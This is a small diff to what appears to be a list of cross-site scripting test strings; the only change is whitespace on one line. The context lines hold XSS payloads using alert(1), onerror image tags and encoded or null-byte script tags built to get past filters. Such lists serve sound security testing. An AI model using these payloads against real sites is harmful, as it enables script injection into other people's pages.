@@ -38,7 +38,7 @@ if("x\\xEE\xA9\x93".length==2) { javascript:alert(1);}
 '`"&gt;&lt;\x00script&gt;javascript:alert(1)
 "'`&gt;&lt;\x3Cimg src=xxx:x onerror=javascript:alert(1)&gt;
 "'`&gt;&lt;\x00img src=xxx:x onerror=javascript:alert(1)&gt;
-style="x:"&gt;
+ style="x:"&gt;
 &lt;--` --!&gt;
 
 x
